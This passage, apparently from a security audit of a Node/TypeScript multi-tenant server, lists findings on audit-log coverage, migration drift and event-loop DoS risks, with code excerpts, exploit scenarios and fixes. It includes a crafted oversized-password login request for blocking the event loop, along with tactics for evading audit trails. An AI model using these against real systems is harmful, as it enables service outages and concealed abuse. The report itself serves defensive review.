Before the UPDATE, read `targetBefore.email` (already fetched at line 1036 if the SELECT is expanded). After the UPDATE, if `email !== null && email !== targetBefore.email`, emit `audit(db, 'user_email_changed', req.user!.id, req.ip || 'unknown', { target_user_id: targetUserId, old_email_hash, new_email_hash })` with SHA-256-truncated hashes instead of plaintext emails.

---

### MEDIUM — Audit log reads not meta-audited

**Where:** `packages/server/src/routes/settings.routes.ts:1913`

**What:**
`GET /settings/audit-logs` is protected by `adminOnly` but reading audit logs is not itself logged. Any admin can silently page through the entire audit history — including other admins' actions, refunds, role changes, GDPR erasures — with no record that the audit data was accessed. Compliance frameworks (SOC 2 CC7, PCI-DSS 10.3) require auditing access to audit records themselves (meta-audit).

**Code:**
```typescript
router.get('/audit-logs', adminOnly, async (req, res) => {
  // ... builds query, fetches rows ...
  res.json({ success: true, data: { logs, ... } });
  // ← no audit() call
});
```

**Exploit:**
An attacker who gains admin credentials reviews the audit trail to understand what is monitored, identify coverage gaps, and time their attack to avoid detection — with no evidence the audit log was ever consulted.

**Fix:**
Add `audit(req.db, 'audit_log_accessed', req.user!.id, req.ip || 'unknown', { page, pageSize, filters: { event, user_id, from_date, to_date } })` before the response. This creates a lightweight breadcrumb that is itself queryable without creating a feedback loop (the access event need not be returned in the same query).

---

### LOW — Backup creation (admin-triggered) not audited

**Where:** `packages/server/src/routes/admin.routes.ts:454`

**What:**
`POST /admin/backup` calls `runBackup(db)` and returns the result. No actor is captured in the audit trail — not `req.user` (if any), not the IP, and not the event. Backup restoration and download are audited (lines 537, 580, 483), creating an asymmetry: it is possible to determine when a backup was downloaded or restored but not when it was created or who triggered it.

**Code:**
```typescript
router.post('/backup', async (req, res) => {
  const db = req.db;
  if (isTenantBackupRunning()) {
    res.status(429).json(...);
    return;
  }
  const result = await runBackup(db);
  res.json({ success: result.success, data: result });
  // ← no audit() call
});
```

**Exploit:**
An attacker with admin access creates a fresh backup (exfiltration precursor) without leaving an audit trail. The download event is logged, but if the attacker uses an out-of-band path to retrieve the file (direct filesystem access, S3 sync), only the creation is relevant.

**Fix:**
Add `audit(db, 'admin_backup_created', req.user?.id ?? null, req.ip || 'unknown', { success: result.success, filename: result.filename ?? null })` after `runBackup()` returns, mirroring the pattern used for restore and download.

---

### LOW — Impersonated-session actions use tenant user_id as actor in tenant audit_log

**Where:** `packages/server/src/routes/super-admin.routes.ts:2677`, `middleware/auth.ts:198`

**What:**
When a super-admin impersonates a tenant user, the issued JWT carries `impersonated: true` (line 2656). However, the `authMiddleware` (middleware/auth.ts) does not read or propagate this flag — `req.user` contains only `{ id, username, role, ... }` of the *target* user. All subsequent `audit()` calls from tenant routes use `req.user!.id` as the actor. In the tenant's `audit_logs` table, actions taken by the super-admin appear to have been taken by the target user, not the impersonator. The master-level `super_admin.impersonate_started` row records the intent, but all subsequent mutations carry the wrong actor.

**Code:**
```typescript
// auth.ts — never reads impersonated from JWT payload
req.user = {
  ...user,   // target user's id, username, role
  permissions: parsedPermissions,
  sessionId: payload.sessionId,
  customRolePermissions,
};

// Later in any route:
audit(db, 'refund_created', req.user!.id, ...);  // records target user, not super-admin
```

**Exploit:**
A super-admin impersonates a tenant admin, issues a large refund, and ends the session. The tenant's `audit_logs.user_id` shows the tenant admin as the refund actor. In a dispute, the tenant admin is blamed; the super-admin's involvement is only recoverable from `master_audit_log` if the investigator knows to look there.

**Fix:**
Propagate `impersonated: true` and `super_admin_id` from the JWT payload into `req.user` (add optional fields to `AuthUser`). In `audit.ts`, add an optional `impersonatedBy` parameter. All routes that call `audit()` during an impersonated session should pass `{ ..., impersonated_by: req.user.superAdminId }` so the tenant audit trail accurately reflects the real actor.

---

### LOW — POS direct INSERT INTO audit_logs bypasses 16 KB cap and event sanitizer

**Where:** `packages/server/src/routes/pos.routes.ts:2396`, `2626`, `2663`

**What:**
Three POS audit writes use raw `adb.run('INSERT INTO audit_logs ...', ..., JSON.stringify(...))` instead of the shared `audit()` helper in `utils/audit.ts`. The helper enforces a 16 KB cap (`MAX_AUDIT_DETAILS_BYTES`) and strips control characters from the event name. The direct INSERTs bypass both protections. The `pos_return` row at line 2628 serializes `returnDetails` (an array of line items with user-supplied `reason` strings) with no length bound.

**Code:**
```typescript
await adb.run(
  'INSERT INTO audit_logs (event, user_id, ip_address, details) VALUES (?, ?, ?, ?)',
  'pos_return', userId, ip,
  JSON.stringify({ invoice_id: invId, ..., items: returnDetails }),  // unbounded
);
```

**Exploit:**
A cashier processing a return with hundreds of line items or very long `reason` strings can insert a multi-megabyte `details` value into `audit_logs`, bloating the SQLite file and potentially causing the nightly incremental vacuum to stall. Not a direct confidentiality risk but can degrade availability and fill disk.

**Fix:**
Replace all three direct INSERTs with calls to `audit(db, event, userId, ip, details)` from `utils/audit.ts` so the 16 KB cap and event sanitizer apply uniformly.

---

### LOW — Tenant audit_logs lacks user_agent column; master_audit_log also missing UA

**Where:** `packages/server/src/db/migrations/022_audit_logs.sql:1`, `packages/server/src/db/master-connection.ts:126`

**What:**
The tenant `audit_logs` table schema (migration 022) has columns: `id, event, user_id, ip_address, details, created_at`. There is no `user_agent` column. The `audit()` helper signature (`event, userId, ip, details`) also does not accept a UA parameter. By contrast, `tenant_auth_events` (master DB) does store `user_agent`. For post-incident forensics it is frequently necessary to correlate an IP with a browser/client to distinguish human from automated abuse; missing UA makes this impossible in the tenant audit trail. `master_audit_log` likewise has no UA column.

**Code:**
```sql
-- migration 022_audit_logs.sql
CREATE TABLE IF NOT EXISTS audit_logs (
    id         INTEGER PRIMARY KEY AUTOINCREMENT,
    event      TEXT NOT NULL,
    user_id    INTEGER,
    ip_address TEXT,
    details    TEXT,          -- UA would need to go in here as a JSON key, not a column
    created_at TEXT NOT NULL DEFAULT (datetime('now'))
);
```

**Exploit:**
After a breach, investigators cannot determine whether actions attributed to a user IP were performed from the user's known browser (legitimate) or a headless script/botnet IP that matched (credential-stuffed session). Forensic reconstruction is severely limited.

**Fix:**
Add a `user_agent TEXT` column to `audit_logs` via a new migration. Extend the `audit()` function signature to accept an optional `ua` string parameter (sourced from `req.headers['user-agent']`). Update call sites for high-sensitivity events (auth, role change, refund, GDPR erase). SQLite TEXT columns have no storage overhead when null, so this is safe to add retroactively.

---

### INFO — 2FA enrollment uses `login_success` event rather than a dedicated `2fa_enrolled` event

**Where:** `packages/server/src/routes/auth.routes.ts:1068`

**What:**
When a user completes 2FA setup for the first time, `audit(db, 'login_success', userId, ip, { method: '2fa_setup' })` is written. This correctly records the login but conflates enrollment with authentication. Querying `SELECT * FROM audit_logs WHERE event = '2fa_enrolled'` returns zero rows; there is no way to list all users who have enrolled 2FA via the audit log alone. This complicates compliance reporting (e.g., "what percentage of users have enrolled 2FA and when?").

**Fix:**
Emit a separate `audit(db, '2fa_enrolled', userId, ip, {})` immediately after line 1054 where `totp_enabled` is set to 1. The existing `login_success` row can remain; the additional row adds precision without removing coverage.

---

### INFO — Audit log retention controlled by env var without an audit-of-change

**Where:** `packages/server/src/index.ts:733`, `2507`

**What:**
`AUDIT_LOG_RETENTION_DAYS` (default 730) is read at startup. Changing this env var silently shortens or extends the retention window. There is no audit row written when the retention window is changed, and no minimum floor is enforced (any integer ≥ 1 is accepted, so `AUDIT_LOG_RETENTION_DAYS=1` would purge 729 days of history on the next 2 AM cron tick). The purge itself (`DELETE FROM audit_logs WHERE created_at < datetime('now', ?)`) leaves no breadcrumb in the audit table.

**Fix:**
Enforce a minimum of 90 days (or a configurable compliance floor). Log a `log.warn` at startup if the configured value is below the minimum. Optionally write an `audit_log_retention_changed` row to the tenant DB at startup when the value differs from the previously-persisted value, creating a record that the window was modified.

---

## Summary

| Severity | Count |
|----------|-------|
| CRITICAL | 0 |
| HIGH     | 0 |
| MEDIUM   | 4 |
| LOW      | 3 |
| INFO     | 2 |

**Most significant gap:** Logout is not audited (`packages/server/src/routes/auth.routes.ts:1418`), user disable is not audited (`settings.routes.ts:1228`), and email changes are not audited (`settings.routes.ts:1192`) — three privilege-relevant mutations in the same update endpoint with inconsistent coverage. During impersonation, the tenant audit trail records the *target user* as actor for all subsequent actions, requiring cross-reference with `master_audit_log` to recover the real super-admin identity.


---

# T18-migration-drift

# T18 — Migration Drift, Schema/Code Mismatches, Missing Indexes, FK Gaps

Audited all 158 migration files (`packages/server/src/db/migrations/`) plus the migration runner (`db/migrate.ts`), cross-referencing code in `routes/`, `middleware/`, and `services/` for column-name drift, missing constraints, and orphan-data paths.

---

### HIGH — Super-admin step-up TOTP always returns 403: wrong column names in SELECT

**Where:** `packages/server/src/middleware/stepUpTotp.ts:362–373`
Also: `packages/server/src/db/master-connection.ts:70–72`

**What:**
`stepUpTotpSuperAdminMiddleware` queries `super_admins` selecting columns `totp_secret`, `totp_iv`, `totp_tag`. The master-DB schema (defined in `master-connection.ts`) names those columns `totp_secret_enc`, `totp_secret_iv`, `totp_secret_tag`. SQLite silently returns `NULL` for non-existent columns in a `SELECT`; the guard at line 373 then unconditionally rejects with `403 "Step-up auth requires 2FA enrollment"`, blocking all enrolled super-admins from every step-up-protected endpoint regardless of valid TOTP.

**Code:**
```typescript
// stepUpTotp.ts:362
.prepare('SELECT id, email, totp_secret, totp_iv, totp_tag FROM super_admins WHERE id = ?...')
// ...
// line 373 — all three fields are NULL → always fires
if (!dbAdmin.totp_secret || !dbAdmin.totp_iv || !dbAdmin.totp_tag) {
  res.status(403).json(errorBody(..., 'Step-up auth requires 2FA enrollment', ...));
  return;
}
```

**Exploit:**
All 17+ endpoints guarded by `requireStepUpTotpSuperAdmin` are permanently inaccessible to enrolled super-admins (`/rotate-jwt-secret`, `DELETE /tenants/:slug`, `/tenants/:slug/backup-restore`, `/config`, etc.). An operator facing an active incident cannot use these endpoints; the effective blast radius is an operational denial-of-service on every critical super-admin mutation.

**Fix:**
Change the `SELECT` in `stepUpTotp.ts:362` to use the correct column names: `totp_secret_enc`, `totp_secret_iv`, `totp_secret_tag`, and update the cast type annotation and the subsequent references at lines 364, 373, and 409 to match.

---

### MEDIUM — Migration 151 silently no-ops for existing DBs (installment_plans schema drift)

**Where:** `packages/server/src/db/migrations/095_billing_enrichment.sql` vs `packages/server/src/db/migrations/151_installment_plans.sql`
Also: `packages/server/src/routes/installments.routes.ts:6`

**What:**
Migration 095 already created `installment_plans` and `installment_schedule` using `CREATE TABLE IF NOT EXISTS`. Migration 151 (intended as the production-quality redesign) also uses `CREATE TABLE IF NOT EXISTS` for both tables. On any database that ran 095 before 151, both `CREATE TABLE` statements in 151 silently no-op, leaving the live schema at the weaker 095 definition: `acceptance_token TEXT` (nullable), `acceptance_signed_at TEXT` (nullable), no `REFERENCES` on `invoice_id`/`customer_id`, no `CHECK (total_cents > 0)`, no `updated_at` column on `installment_plans`, and `installment_schedule.plan_id INTEGER NOT NULL` with **no `REFERENCES` clause at all**. The route comment (`Tables: installment_plans, installment_schedule (migration 095_billing_enrichment.sql)`) confirms the developer tracked this, but the stronger 151 constraints never land.

**Code:**
```sql
-- 095 schema (what actually runs):
acceptance_token      TEXT,           -- nullable
acceptance_signed_at  TEXT,           -- nullable
plan_id               INTEGER NOT NULL -- no REFERENCES, no CASCADE

-- 151 schema (silently skipped for existing DBs):
acceptance_token     TEXT    NOT NULL,
plan_id     INTEGER NOT NULL REFERENCES installment_plans(id) ON DELETE CASCADE,
```

**Exploit:**
Application-level validation in `installments.routes.ts` enforces `acceptance_token` non-empty, but a direct DB write (maintenance script, import, future bypass) can insert a NULL token, creating a legally void payment plan. More critically, `plan_id` carries no FK—see the next finding for the GDPR cascade consequence.

**Fix:**
Replace the `CREATE TABLE IF NOT EXISTS` in migration 151 with an `ALTER TABLE`-based migration that adds the missing columns and a table-rebuild that adds the proper FK/CHECK constraints (using the `PRAGMA writable_schema` or rename-copy pattern from migrations 042, 074, 099).

---

### MEDIUM — GDPR erasure leaves orphaned `installment_schedule` rows

**Where:** `packages/server/src/db/migrations/097_enrichment_cleanup_triggers.sql:83`
Also: `packages/server/src/db/migrations/095_billing_enrichment.sql` (installment_schedule DDL)

**What:**
The `trg_customer_del_enrichment_cleanup` trigger fires on customer hard-delete (GDPR erasure) and runs `DELETE FROM installment_plans WHERE customer_id = OLD.id`. However, `installment_schedule.plan_id` in the 095 schema is declared `INTEGER NOT NULL` with **no `REFERENCES installment_plans(id)` clause** — SQLite therefore applies no cascade. After the trigger removes plan rows, all child `installment_schedule` rows survive with dangling `plan_id` values. Neither migration 097 nor any later migration adds a cleanup statement for `installment_schedule`.

**Code:**
```sql
-- 097 trigger body (partial):
DELETE FROM installment_plans    WHERE customer_id = OLD.id;
-- installment_schedule is NOT listed — orphans remain

-- 095 installment_schedule.plan_id (no FK):
plan_id   INTEGER NOT NULL,   -- no REFERENCES, no ON DELETE CASCADE
```

**Exploit:**
After a GDPR erasure request for a customer with active payment plans, `installment_schedule` rows referencing deleted `plan_id` values persist indefinitely. This violates the erasure contract (GDPR Art. 17) and leaks PII-adjacent financial data (amount_cents, due_date) tied to the erased customer's plans.

**Fix:**
Add `DELETE FROM installment_schedule WHERE plan_id IN (SELECT id FROM installment_plans WHERE customer_id = OLD.id)` *before* the `DELETE FROM installment_plans` line in the trigger body, or add `REFERENCES installment_plans(id) ON DELETE CASCADE` to `installment_schedule.plan_id` via a table rebuild.

---

### LOW — `email_messages` missing `created_at` index; PII retention sweep is a full table scan

**Where:** `packages/server/src/db/migrations/001_initial.sql:815`
Also: `packages/server/src/services/retentionSweeper.ts:464`

**What:**
`email_messages` was created with a single index on `(entity_type, entity_id)`. No `created_at` index exists in any of the 158 migrations. The PII retention sweeper executes `DELETE FROM email_messages WHERE created_at < datetime('now', '-N months')` (retentionSweeper.ts:464). Without a `created_at` index, this is a full table scan every sweep cycle. A shop running a multi-year email history with tens of thousands of rows will see the nightly sweep cron hold a write-lock on the table for an extended period.

**Code:**
```typescript
// retentionSweeper.ts:464
const sql = `DELETE FROM ${rule.table} WHERE ${rule.dateColumn} < ${cutoff}`;
// For email_messages: full table scan, no index
```

**Exploit:**
An attacker who can trigger high email traffic (booking confirmations, invoice reminders) to grow `email_messages` can cause the nightly retention sweep to lock the table long enough to starve concurrent read/write operations, degrading service availability.

**Fix:**
Add `CREATE INDEX IF NOT EXISTS idx_email_messages_created_at ON email_messages(created_at);` in a new migration. Compare with `call_logs` which correctly has `idx_call_logs_created_at` (migration 043) and `sms_messages` which has `idx_sms_messages_created_at` (migration 001).

---

### INFO — Four duplicate migration numbers (049, 050, 100, 149) with distinct filenames

**Where:** `packages/server/src/db/migrations/` — files prefixed `049_*`, `050_*`, `100_*`, `149_*`

**What:**
The migration runner sorts filenames lexicographically and tracks by filename, so all eight files across the four sets apply correctly and without collision. However, three files share prefix `049_`, two share `050_`, two share `100_`, and two share `149_`. Any new migration numbered 049–050 or 100 or 149 added by a developer would collide in lexicographic ordering with an ambiguous position relative to the existing duplicates, silently interleaving execution order in unexpected ways.

**Code:**
```
049_customer_is_active.sql
049_po_status_workflow.sql
049_sms_scheduled_and_archival.sql
100_payment_capture_state.sql
100_recovery_cooldown.sql
149_customers_lat_lng.sql
149_retention_default_off.sql
```

**Exploit:**
No current exploitability. A future developer adding migration `049_something.sql` would get surprising interleaving if any of the three existing 049-prefix migrations modify a table the new one depends on.

**Fix:**
Renumber the duplicate-suffix migrations to use the next available sequential numbers (155, 156, …) in a non-destructive rename (update `_migrations` tracking table for existing deployments). Enforce the convention in code review.

---

### INFO — `gift_cards.code_hash` non-unique index; original `code` column still plaintext

**Where:** `packages/server/src/db/migrations/104_gift_card_code_hash.sql:22–25`
Also: `packages/server/src/db/migrations/028_gift_cards.sql` (`code TEXT NOT NULL UNIQUE`)

**What:**
Migration 028 created `gift_cards.code` with a `UNIQUE` constraint. Migration 104 added `code_hash TEXT` with a non-unique index only. The comment in 104 notes a planned follow-up migration to drop the plaintext `code` column "once all redemption paths are hash-first," but that follow-up has not landed in any of the 158 migrations. The plaintext card code therefore persists in the database alongside the hash, and `code_hash` has no UNIQUE constraint—while SHA-256 collision is astronomically unlikely, the inconsistency means a card lookup by hash could theoretically return multiple rows on a corrupted dataset.

**Code:**
```sql
-- migration 028: code has UNIQUE
code TEXT NOT NULL UNIQUE,

-- migration 104: code_hash has plain index only
ALTER TABLE gift_cards ADD COLUMN code_hash TEXT;
CREATE INDEX IF NOT EXISTS idx_gift_cards_code_hash ON gift_cards(code_hash);
-- no UNIQUE
```

**Exploit:**
Plaintext codes in `gift_cards.code` are visible to anyone with DB read access (backup exfiltration, DB admin account compromise). No direct web exploitability beyond S05/SEC-H38 scope.

**Fix:**
(1) Add `CREATE UNIQUE INDEX IF NOT EXISTS idx_gift_cards_code_hash_unique ON gift_cards(code_hash) WHERE code_hash IS NOT NULL` in a new migration. (2) Schedule the planned column drop of `code` once the backfill service (`giftCardCodeHashBackfill.ts`) confirms 100% coverage.

---


---

# T19-resource-dos

# T19 — Resource Exhaustion / DoS Surface

**Auditor:** T19 agent  
**Date:** 2026-05-06  
**Backend root:** `packages/server/src/`

---

### [MEDIUM] bcrypt.compareSync called without password length guard in /login, /gdpr-erase, and /settings user-edit reauth paths

**Where:**  
- `packages/server/src/routes/auth.routes.ts:746` (`/login`)  
- `packages/server/src/routes/customers.routes.ts:2024` (`/customers/:id/gdpr-erase`)  
- `packages/server/src/routes/settings.routes.ts:1122` (user update reauth)  

**What:**  
`bcrypt.compareSync` is a pure-JS, synchronous operation that runs on Node's single event loop thread. The login handler at line 746 reads `password` from `req.body` and passes it directly to `bcrypt.compareSync` without checking its length first. The global body-parser limit (`1mb`) means an attacker can submit a password string of ~700 000 characters. With bcrypt at 12 rounds, hashing a 72-byte input takes ~100–200 ms; bcryptjs (pure-JS) at that cost factor blocks the event loop entirely for the duration. The `/gdpr-erase` endpoint (line 2024) has no length guard at all on the `password` field, and the settings reauth path (line 1122) only checks that the string is non-empty.

**Code:**
```typescript
// auth.routes.ts ~line 712-746 — /login
const { username, password } = req.body;
if (!username) { … return; }
// ← NO password.length check here
const hashToCheck = user?.password_hash || DUMMY_HASH;
const bcryptResult = password ? bcrypt.compareSync(password, hashToCheck) : false;

// customers.routes.ts ~line 2013-2024 — /gdpr-erase
const { password } = req.body;
if (!password) throw new AppError('Password confirmation is required …', 400);
// ← NO length cap
const passwordValid = bcrypt.compareSync(password, adminUser.password_hash);
```

**Exploit:**  
An attacker (authenticated or not for the login endpoint) sends `POST /api/v1/auth/login` with `{"username":"x","password":"A".repeat(900000)}`. The rate limiter fires a DB check first but does not reject oversized passwords, so `bcrypt.compareSync` runs the full PBKDF-equivalent loop synchronously, stalling the event loop for several hundred ms per request. At the 300 req/min global rate limit, an attacker on multiple IPs can keep the event loop saturated continuously, causing all other requests to queue and time out — effective DoS for the entire server.

**Fix:**  
Add `if (!password || typeof password !== 'string' || password.length > 128) { reject }` before any `bcrypt.compareSync` call in all three locations, mirroring the cap already in place in `auth.routes.ts:892` (reset-password), `settings.routes.ts:951` (user creation), and `auth.routes.ts:612` (set-password). 128 chars is generous for legitimate users and bcryptjs truncates at 72 anyway.

---

### [MEDIUM] `crypto.pbkdf2Sync` (100 000 iterations) and `crypto.scryptSync` (N=32768) called on main event-loop thread during backup encryption/decryption and tenant export

**Where:**  
- `packages/server/src/services/backup.ts:297` — `pbkdf2Sync` (100k iterations, SHA-512)  
- `packages/server/src/services/tenantExport.ts:288` — `scryptSync` (N=32768, r=8, p=1)  

**What:**  
`deriveKey()` in `backup.ts` calls `crypto.pbkdf2Sync` with 100 000 iterations on the synchronous path. It is invoked from `encryptFile` and `decryptFile`, which are in turn awaited by `runBackup` and `restoreBackup`. Both are called directly from HTTP route handlers (`POST /admin/backup` at `admin.routes.ts:460` and `POST /admin/backups/:filename/restore` at `admin.routes.ts:540`). The `tenantExport.ts` version uses `scryptSync` inside `encryptBuffer`, which is called from `runExportJob`; however, `runExportJob` is deferred via `setImmediate` so it still runs on the main thread, just deferred by one tick. A large backup (the SQLite DB + uploads) will block the event loop for ~50–300 ms per call.

**Code:**
```typescript
// backup.ts:295-297
function deriveKey(salt: Buffer, version: number): Buffer {
  const passphrase = getPassphrase(version);
  return crypto.pbkdf2Sync(passphrase, salt, PBKDF2_ITERATIONS, KEY_LEN, 'sha512');
  // PBKDF2_ITERATIONS = 100_000 — blocks event loop ~50-200ms
}

// tenantExport.ts:287-292
const key = crypto.scryptSync(passphrase, salt, KEY_LEN, {
  N: SCRYPT_N,   // 32_768
  r: SCRYPT_R,   // 8
  p: SCRYPT_P,   // 1
});  // blocks event loop ~50-200ms on main thread
```

**Exploit:**  
An admin repeatedly triggers `POST /admin/backup` (no concurrency mutex on the backup route itself, only a backup-running flag inside `runBackup`). Each call blocks the event loop for ~100–300 ms during `pbkdf2Sync`. If the DB file is large enough that `fsp.readFile` also loads multi-GB into memory (line 302), the combined block + GC pause can stall normal request handling. A compromised admin account can DoS the tenant's server this way.

**Fix:**  
Replace `pbkdf2Sync` with `util.promisify(crypto.pbkdf2)(…)` and `scryptSync` with `util.promisify(crypto.scrypt)(…)` which offload to libuv's thread pool, keeping the event loop free. Alternatively, derive keys in a Piscina worker (the worker pool already exists for DB I/O). The backup restore path (`admin.routes.ts:540`) must also be made fully async by converting `decryptFile` to a streaming pipeline so multi-GB DB files are never fully read into memory.

---

### [MEDIUM] `fs.createReadStream` without `.on('error')` handler in two voice recording endpoints — file descriptor leak on stream errors

**Where:**  
- `packages/server/src/routes/voice.routes.ts:298` — `GET /voice/recording/:id` (signed-URL endpoint)  
- `packages/server/src/routes/voice.routes.ts:371` — `GET /voice/calls/:id/recording` (authed endpoint)  

**What:**  
Both endpoints call `fs.createReadStream(filePath).pipe(res)` without attaching an `'error'` event listener. If the underlying file disappears, the OS revokes read permission, or a disk I/O error occurs mid-stream, Node emits an `'error'` event on the readable stream. Without a listener, this becomes an unhandled `'error'` event and crashes the process (Node treats unhandled `'error'` events as fatal). Additionally, an unfinished pipe on an errored stream can leave the file descriptor open until GC cleans it up, slowly exhausting the fd limit. This is in contrast to `admin.routes.ts:490–496` which correctly registers `.on('error', …)`.

**Code:**
```typescript
// voice.routes.ts:295-299
if (fs.existsSync(filePath)) {
  res.setHeader('Content-Type', 'audio/mpeg');
  res.setHeader('Cache-Control', 'no-store');
  fs.createReadStream(filePath).pipe(res);   // ← no .on('error', ...)
  return;
}

// voice.routes.ts:368-372
const filePath = path.join(config.uploadsPath, …);
res.setHeader('Content-Type', 'audio/mpeg');
fs.createReadStream(filePath).pipe(res);     // ← no .on('error', ...)
```

**Exploit:**  
An attacker who can cause a race between the `fs.existsSync` check and the `createReadStream` call (e.g., by deleting the recording file via an admin API after obtaining its path) can trigger an unhandled stream error on the HTTP worker. On older Node versions (< 18.11) this crashes the process; on newer versions the async context catches it, but the fd may still leak until GC. In a heavily loaded environment with many concurrent recording requests this can exhaust file descriptors.

**Fix:**  
Attach `.on('error', (err) => { log.error(…); if (!res.headersSent) res.status(500).end(); else res.destroy(); })` on both stream instances, mirroring the pattern in `admin.routes.ts:491–497`. Consider using `pipeline(stream, res)` from `node:stream/promises` which automatically destroys both on error.

---

### [LOW] `node-cron` backup tasks (`scheduleBackup`, `scheduleMultiTenantBackups`) are never stopped during graceful shutdown

**Where:**  
- `packages/server/src/services/backup.ts:992` — `cronTask = cron.schedule(…)`  
- `packages/server/src/services/backup.ts:1032` — `multiTenantBackupCron = cron.schedule('7 3 * * *', …)`  
- `packages/server/src/index.ts:3768` — shutdown loop only clears `backgroundIntervals`  

**What:**  
Both backup cron tasks are `node-cron` `ScheduledTask` objects, not raw `NodeJS.Timeout` handles. They are NOT pushed into `backgroundIntervals` and their `.stop()` method is never called in the `shutdown()` function. If a cron tick fires during the shutdown window (after `backgroundIntervals` are cleared but before `process.exit()`), it will attempt to open/read the tenant DB after `closeAllTenantDbs()` has already closed it, producing "database is closed" errors in logs and potentially crashing the teardown path.

**Code:**
```typescript
// backup.ts:992 — module-scoped, never exported for shutdown
cronTask = cron.schedule(schedule, () => { … runBackup(getDb()) … });

// index.ts:3768 — shutdown only covers backgroundIntervals
for (const handle of backgroundIntervals) {
  try { clearInterval(handle); cleared++; } catch { /* ignore */ }
}
// ← no cronTask.stop() or multiTenantBackupCron.stop()
```

**Exploit:**  
During graceful shutdown at 3:07 AM (the scheduled backup time), `multiTenantBackupCron` fires as the server is closing, opens tenant DB handles (which may already be closed), and crashes with "database is closed" errors. This is observable as a non-zero exit code, confusing PM2's restart logic and potentially masking the real shutdown signal.

**Fix:**  
Export `stopBackupScheduler()` from `backup.ts` that calls `cronTask?.stop()` and `multiTenantBackupCron?.stop()`, and call it at the start of `shutdown()` in `index.ts` alongside `stopWebSocketHeartbeat()`. Similarly, `stopMetricsCollector()` (which already exists in `metricsCollector.ts:359`) is never called during shutdown — add it to the shutdown sequence to prevent the self-rescheduling `setTimeout` chain from firing after DB teardown.

---

### [LOW] Four external cron timers (`receiptOcrCron`, `recurringInvoicesCron`, `dataExportScheduleCron`, `slaBreachCron`) use raw `setInterval` without `.unref()`, preventing clean process exit if `backgroundIntervals` cancellation is skipped

**Where:**  
- `packages/server/src/services/receiptOcrCron.ts:184`  
- `packages/server/src/services/recurringInvoicesCron.ts:336`  
- `packages/server/src/services/dataExportScheduleCron.ts:290`  
- `packages/server/src/services/slaBreachCron.ts:284`  

**What:**  
All four service files return a `NodeJS.Timeout` from `setInterval(…)` without calling `.unref()`. They are pushed into `backgroundIntervals` in `index.ts` and cleared during normal shutdown. However, if a `process.exit` path fires before the graceful shutdown handler runs (e.g., an uncaught exception in early boot before the handlers are registered), these ref'd timers prevent the process from exiting naturally, causing PM2 or Docker's `kill_timeout` to force-kill with SIGKILL. By contrast, `trackInterval()` in `utils/trackInterval.ts:59` calls `.unref()` by default — the external cron helpers do not use `trackInterval`.

**Code:**
```typescript
// receiptOcrCron.ts:184 — no .unref()
return setInterval(() => void tick(), CRON_INTERVAL_MS);

// recurringInvoicesCron.ts:336 — no .unref()
return setInterval(tick, CRON_INTERVAL_MS);
```

**Exploit:**  
If the server hard-exits (OOM kill, uncaught exception before shutdown handlers register), these intervals keep Node's event loop alive, causing a hung process that PM2 must SIGKILL after `kill_timeout`. In a container environment this means the pod does not exit cleanly, blocking re-scheduling.

**Fix:**  
Call `.unref()` on the returned handle in each file before returning, or refactor these services to use `trackInterval()` from `utils/trackInterval.ts` which already handles `unref`, error catching, and `backgroundIntervals` registration consistently.

---

### [LOW] `/health` and `/api/v1/health` run a synchronous DB `SELECT 1` probe on every request with no rate limit

**Where:**  
- `packages/server/src/index.ts:1863–1886` — `probeMasterDb()`, `/health`, `/api/v1/health`  

**What:**  
Both `/health` and `/api/v1/health` routes call `probeMasterDb()` which executes `db.prepare('SELECT 1').get()` synchronously on every hit. These endpoints are mounted outside the `/api/v1` rate-limiter scope (the limiter is `app.use('/api/v1', …)` at line 1181 which activates only inside that prefix, and `/health` is at the root). A monitoring service, load balancer, or attacker polling at high frequency will execute a synchronous DB round-trip per request. While `SELECT 1` is extremely cheap, thousands of requests per second from a health-check flood can still add measurable synchronous pressure to the event loop.

**Code:**
```typescript
// index.ts:1863-1878 — no rate limit, no cache
function probeMasterDb(): boolean {
  try { db.prepare('SELECT 1').get(); return true; } catch { return false; }
}
app.get('/health', (_req, res) => {
  if (!probeMasterDb()) { res.status(503)…; return; }
  res.json({ success: true, data: { status: 'ok' } });
});
```

**Exploit:**  
An external client or scanner floods `/health` at 10 000 req/s. Each call executes a synchronous SQLite read. The combined synchronous pressure degrades response times for authenticated API routes sharing the same event loop.

**Fix:**  
Cache the `probeMasterDb()` result in a module-level variable with a 5-second TTL (the watchdog polls `/api/v1/health/live` at 30s so 5s staleness is safe). Alternatively, add a lightweight in-process IP rate limit (e.g., `consumeWindowRate` at 60 req/min per IP) on these two probes using the existing SQLite rate-limiter.

---

### [LOW] Backup `encryptFile`/`decryptFile` read entire DB file into memory before processing — unbounded memory spike on large databases

**Where:**  
- `packages/server/src/services/backup.ts:302` — `await fsp.readFile(inputPath)` (entire DB into Buffer)  
- `packages/server/src/services/backup.ts:336` — `await fsp.readFile(encPath)` (entire `.enc` into Buffer)  
- `packages/server/src/services/backup.ts:907` — `await fsp.readFile(opts.targetDbPath)` (for SHA-256 hash)  

**What:**  
`encryptFile` reads the entire DB file into `plaintext` with a single `fsp.readFile`, allocates another `Buffer` for the ciphertext, then concatenates them for the write — tripling peak memory for the duration. For a 500 MB SQLite database this spikes RSS by ~1.5 GB in a single backup call. `decryptFile` does the same for the encrypted file. The ecosystem config sets `max_memory_restart: '1G'` for the PM2 process; a backup on a large tenant DB will trip the restart threshold and kill the server mid-backup.

**Code:**
```typescript
// backup.ts:300-316
export async function encryptFile(inputPath: string): Promise<string> {
  const plaintext = await fsp.readFile(inputPath);      // entire DB → Buffer
  const key = deriveKey(salt, CURRENT_KEY_VERSION);
  const cipher = crypto.createCipheriv(ENCRYPTION_ALGO, key, iv);
  const encrypted = Buffer.concat([cipher.update(plaintext), cipher.final()]); // 2× size
  await fsp.writeFile(outputPath,
    Buffer.concat([BACKUP_MAGIC, versionByte, salt, iv, authTag, encrypted])); // 3× size peak
```

**Exploit:**  
A production tenant with a 400 MB database triggers the daily backup cron. The RSS spikes by ~1.2 GB, crossing the 1 GB PM2 `max_memory_restart` threshold, which kills and restarts the server. The partially written `.enc` file is left on disk but the DB handle is closed mid-operation. Repeated oscillation causes PM2 to exhaust `max_restarts: 10` and permanently disable the app.

**Fix:**  
Implement the backup as a streaming pipeline: `fs.createReadStream(inputPath)` piped through `crypto.createCipheriv(…)` piped to `fs.createWriteStream(outputPath)`. This reduces peak memory from 3× file size to a few kilobytes of cipher block size. The SHA-256 hash post-restore (line 907) should similarly use `crypto.createHash('sha256').update(readStream)` instead of buffering the full file.

---

